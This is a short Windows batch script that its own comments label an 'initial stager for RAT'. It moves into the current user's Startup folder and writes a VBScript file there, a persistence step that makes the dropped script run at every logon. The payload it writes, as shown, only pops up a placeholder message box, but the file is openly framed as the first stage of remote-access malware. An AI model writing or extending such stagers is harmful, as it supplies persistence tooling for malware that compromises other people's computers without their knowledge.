
@echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM move into startup directory
cd C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup
@REM write payloads to startup
(echo MsgBox "Line 1" ^& vbCrLf ^& "Line 2",262192, "Title")> popup.vbs
